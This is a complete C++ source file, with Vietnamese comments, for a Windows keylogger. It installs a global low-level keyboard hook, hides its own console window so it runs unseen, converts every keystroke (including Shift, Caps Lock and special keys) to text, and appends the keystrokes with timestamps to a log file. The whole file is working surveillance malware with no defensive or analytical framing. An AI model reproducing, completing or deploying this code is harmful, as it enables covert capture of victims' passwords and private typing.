#include <windows.h>
#include <fstream>
#include <string>
#include <map>
#include <ctime>

HHOOK keyboardHook;
std::ofstream logFile("log.txt", std::ios::app);

// Hàm lấy thời gian hiện tại
std::string GetTimeStamp() {
    time_t now = time(0);
    tm localTime;
    localtime_s(&localTime, &now);

    char buffer[80];
    strftime(buffer, sizeof(buffer), "\n[%Y-%m-%d %H:%M:%S] ", &localTime);
    return std::string(buffer);
}

// Hàm chuyển mã VK thành ký tự
std::string VKToString(DWORD vkCode) {
    std::string result = "";

    // Kiểm tra trạng thái Shift và Caps Lock
    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    // Chữ cái A-Z
    if (vkCode >= 0x41 && vkCode <= 0x5A) {
        char c = (char)vkCode;
        if (shift ^ caps)
            result += c;
        else
            result += tolower(c);
    }

    // Số và ký tự đặc biệt hàng trên bàn phím
    else if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (shift) {
            const char* symbols = ")!@#$%^&*(";
            result += symbols[vkCode - 0x30];
        } else {
            result += (char)vkCode;
        }
    }

    // Một số phím đặc biệt
    else {
        switch (vkCode) {
            case VK_SPACE: result = " "; break;
            case VK_RETURN: result = "[ENTER]\n" + GetTimeStamp(); break;
            case VK_BACK: result = "[BACKSPACE]"; break;
            case VK_TAB: result = "[TAB]"; break;
            case VK_ESCAPE: result = "[ESC]"; break;
            case VK_SHIFT: result = "[SHIFT]"; break;
            case VK_CONTROL: result = "[CTRL]"; break;
            case VK_MENU: result = "[ALT]"; break;
            case VK_CAPITAL: result = "[CAPSLOCK]"; break;
            case VK_LEFT: result = "[LEFT]"; break;
            case VK_RIGHT: result = "[RIGHT]"; break;
            case VK_UP: result = "[UP]"; break;
            case VK_DOWN: result = "[DOWN]"; break;
            default:
                result = "[UNK_" + std::to_string(vkCode) + "]";
        }
    }

    return result;
}

// Callback hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        std::string keyStr = VKToString(kbStruct->vkCode);
        logFile << keyStr;
        logFile.flush();
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Ẩn cửa sổ console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Ghi mốc thời gian khi bắt đầu
    logFile << GetTimeStamp();

    // Cài hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook) return 1;

    // Vòng lặp message
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    logFile.close();
    return 0;
}
